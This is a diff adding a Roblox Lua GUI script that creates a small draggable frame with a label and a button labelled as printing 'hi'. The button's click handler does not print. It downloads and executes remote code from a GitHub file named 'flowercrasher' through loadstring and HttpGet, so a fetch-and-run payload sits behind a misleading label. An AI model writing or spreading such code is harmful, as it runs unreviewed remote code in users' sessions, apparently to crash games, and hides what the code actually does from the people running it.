@@ -1,0 +1,42 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local Main = Instance.new("Frame")
+local label = Instance.new("TextLabel")
+local script = Instance.new("TextButton")
+
+--Properties:
+
+Main.Name = "Main"
+Main.Parent = game.Workspace.ScreenGui
+Main.BackgroundColor3 = Color3.fromRGB(47, 47, 47)
+Main.Position = UDim2.new(0.736915112, 0, 0.452525228, 0)
+Main.Size = UDim2.new(0, 258, 0, 241)
+Main.Active = true
+Main.Draggable = true
+
+
+label.Name = "label"
+label.Parent = Main
+label.BackgroundColor3 = Color3.fromRGB(168, 164, 164)
+label.Size = UDim2.new(0, 258, 0, 50)
+label.Font = Enum.Font.ArialBold
+label.Text = "Prueba"
+label.TextColor3 = Color3.fromRGB(0, 0, 0)
+label.TextSize = 14.000
+
+script.Name = "script"
+script.Parent = Main
+script.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+script.Position = UDim2.new(0.112403102, 0, 0.278008312, 0)
+script.Size = UDim2.new(0, 200, 0, 50)
+script.Font = Enum.Font.SourceSans
+script.Text = "Print''hi''"
+script.TextColor3 = Color3.fromRGB(0, 0, 0)
+script.TextSize = 14.000
+script.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/el0001/DHMarket/main/flowercrasher", true))()
+
+end)
